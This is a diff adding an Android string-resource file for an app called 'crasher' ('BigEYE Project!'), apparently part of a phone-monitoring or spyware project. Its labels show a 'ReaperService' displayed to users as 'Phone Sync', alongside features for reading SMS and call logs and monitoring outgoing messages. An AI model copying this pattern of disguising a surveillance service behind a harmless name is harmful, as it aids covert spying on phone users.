@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+
+    <string name="app_name">crasher</string>
+    <string name="action_settings">Settings</string>
+    <string name="hello_world">BigEYE Project!</string>
+    <string name="ReaperService">Phone Sync</string>
+    <string name="MonitorOutgoingSMS">Monitor Outgoing SMS</string>
+    <string name="ReadCallLogs">Read call logs</string>
+    <string name="ReadSMSLogs">Read sms logs</string>
+    <string name="MonitorCallLogs">Monitor call Logs</string>
+
+</resources>
